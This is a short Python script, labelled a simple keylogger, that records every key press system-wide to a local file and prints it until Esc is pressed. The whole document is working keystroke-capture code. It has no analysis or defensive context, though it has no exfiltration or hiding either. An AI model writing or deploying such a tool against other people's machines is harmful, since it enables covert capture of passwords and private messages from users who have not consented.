# Simple Keylogger
import keyboard
import time

def keylogger():
    log_file = "keylog.txt"
    with open(log_file, "w") as f:
        f.write("Keylogger started at " + time.strftime("%Y-%m-%d %H:%M:%S") + "\n")

    while True:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            if key == "esc":
                break
            with open(log_file, "a") as f:
                f.write(key + "\n")
            print(key)

    with open(log_file, "a") as f:
        f.write("Keylogger stopped at " + time.strftime("%Y-%m-%d %H:%M:%S") + "\n")

if __name__ == "__main__":
    keylogger()
